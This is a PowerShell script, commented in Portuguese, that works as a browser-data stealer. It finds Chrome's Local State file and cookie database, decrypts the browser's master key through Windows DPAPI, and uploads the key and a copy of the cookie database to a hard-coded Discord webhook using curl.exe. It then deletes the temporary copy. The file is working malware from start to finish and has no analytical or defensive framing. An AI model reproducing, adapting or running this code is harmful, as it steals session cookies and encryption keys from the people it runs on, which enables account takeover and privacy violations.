$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"

# 1. Carrega a biblioteca e espera o Windows 'respirar'
Add-Type -AssemblyName System.Security
Start-Sleep -s 2

try {
    $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    $ls = Get-ChildItem -Path $base -Recurse -Filter "Local State" | Select-Object -First 1
    $lc = Get-ChildItem -Path $base -Recurse -Filter "Cookies" | Where-Object { $_.FullName -like "*Network*" } | Select-Object -First 1

    if (!$ls) { curl.exe -F "content=ERRO:LocalState_nao_achado" $u; exit }

    # 2. Pega a chave do JSON
    $j = Get-Content $ls.FullName -Raw | ConvertFrom-Json
    $encKey = $j.os_crypt.encrypted_key
    $bytes = [Convert]::FromBase64String($encKey)[5..($encKey.Length - 1)]

    # 3. Pausa estratégica antes de descriptografar
    Start-Sleep -s 1

    try {
        # Tenta descriptografar a Master Key
        $unp = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser')
        $masterKey = [Convert]::ToBase64String($unp)
        
        # Manda a chave já aberta (Pronta para usar no seu Python em Apucarana)
        curl.exe -F "content=CHAVE_MESTRA_PRONTA:$masterKey" $u
    } catch {
        # Se falhar, manda a bruta como backup final
        curl.exe -F "content=CHAVE_BRUTA_BACKUP:$encKey" $u
    }

    # 4. Envia o Banco de Cookies (se existir)
    if ($lc) {
        $t = "$env:TEMP\C.db"
        Copy-Item $lc.FullName $t -Force
        curl.exe -F "file=@$t" $u
        Start-Sleep -s 1
        Remove-Item $t -Force
    }

} catch {
    curl.exe -F "content=ERRO_NO_PROCESSO" $u
}

exit
